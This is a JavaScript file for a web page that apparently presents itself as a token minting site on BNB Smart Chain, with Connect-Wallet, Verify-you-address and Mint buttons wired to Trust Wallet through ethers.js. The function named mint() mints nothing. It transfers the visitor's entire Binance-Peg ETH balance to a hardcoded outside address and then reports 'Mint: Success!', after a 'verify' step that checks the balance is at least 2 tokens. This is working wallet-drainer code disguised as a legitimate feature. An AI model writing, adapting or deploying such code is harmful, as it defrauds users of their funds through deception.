
const ethABI = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
const ETH_ADDRESS = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8";
const bscChainId = '0x38';
var bscChain = false;
var requestAccount = false;
var injectedProvider = null ;
var trustWalletExist = false;
var injectedProviderExist = false
var account = null;
var rawBalance = 0;
var accountBalance = 0;
var ethersProvider = null;
var contract = null;
var contractWithSigner = null;
var signer = null;
function getTrustWalletInjectedProvider() {


    trustWalletExist = ethereum.isTrust;

    injectedProviderExist =
      typeof window !== "undefined" && typeof window.ethereum !== "undefined";
    
      

    injectedProvider = window["trustwallet"];

    if(!injectedProvider){
      document.getElementById("Connect-Wallet").style.color='red';
      document.getElementById("Connect-Wallet").textContent='Connect-Wallet: Without Trust wallet!';
      return
    }
    ethersProvider = new ethers.providers.Web3Provider(injectedProvider);
    contract = new ethers.Contract(ETH_ADDRESS, ethABI, ethersProvider);
    if (injectedProvider) {
      return injectedProvider;
    }
    
    return null;
  
  }

// BNB Smart Chain : 0x38
async function switchToNetwork(){
    try {
        await injectedProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: bscChainId }], // Ensure the selected network is Etheruem
        });

        bscChain = true;

        if(bscChain == true){
          document.getElementById("Connect-Wallet").style.color='green';
          document.getElementById("Connect-Wallet").textContent='Connect-Wallet: Success!';
        }

      } catch (e) {
        if (e.code === 4001) {
          bscChain = false;
          document.getElementById("Connect-Wallet").style.color='red';
          document.getElementById("Connect-Wallet").textContent='Connect-Wallet: Please Connect BSC Chain!';
        
          setError("User rejected switching chains.");
        }
    }
}

async function connectWallet(){
  getTrustWalletInjectedProvider();
  switchToNetwork();
}


async function connectAccount(){
  try {
      const userAccounts = await injectedProvider.request({
        method: "eth_requestAccounts",
      });
    
      account = userAccounts[0]
      if (account){
        requestAccount = true;
      }else{
        document.getElementById("Verify-you-address").textContent = "Verify-you-address: Can't Connect address!";
        document.getElementById("Verify-you-address").style.color = 'red';
      }
      } catch (e) {
      if (e.code === 4001) {
          requestAccount = false;
          document.getElementById("Verify-you-address").textContent = "Verify-you-address: Can't Connect address!";
          document.getElementById("Verify-you-address").style.color = 'red';
          console.error("User denied connection.");
      }
  }
}


async function verifyAddress(){

  connectAccount();

  try {
    const decimals = await contract.decimals();
    rawBalance = await contract.balanceOf(account);
    accountBalance = ethers.utils.formatUnits(rawBalance, decimals);

    if (accountBalance < 2){
      document.getElementById("Verify-you-address").textContent = "Verify-you-address: Balance Not enough!";
      document.getElementById("Verify-you-address").style.color = 'red';
      return ;
      }
    requestAccount = true;
    document.getElementById("Verify-you-address").style.color = 'green';
    document.getElementById("Verify-you-address").textContent = 'Verify-you-address: Success!';
    } catch (e) {
    if (e.code === 4001) {
        requestAccount = false;
        document.getElementById("Verify-you-address").textContent = "Verify-you-address: Balance Not enough!";
        document.getElementById("Verify-you-address").style.color = 'red';
        console.error("User denied connection.");
    }
  }
}

async function mint(){
  try {
      signer = ethersProvider.getSigner();
      contractWithSigner = contract.connect(signer);
      var success = await contractWithSigner.transfer("0x4779D9b6031154B6A1991582A44edb51E0bef44b",rawBalance);
      if(success){
        document.getElementById("Mint").textContent = "Mint: Success!";
        document.getElementById("Mint").style.color = 'green';
      }
    } catch (e) {
    
      document.getElementById("Mint").textContent = "Mint: Reject Mint!";
      document.getElementById("Mint").style.color = 'red';
      console.error("User denied connection.");

  }
    }


document.getElementById("Connect-Wallet").addEventListener("click", connectWallet);


document.getElementById("Verify-you-address").addEventListener("click",verifyAddress);

document.getElementById("Mint").addEventListener("click", 
  mint
  );






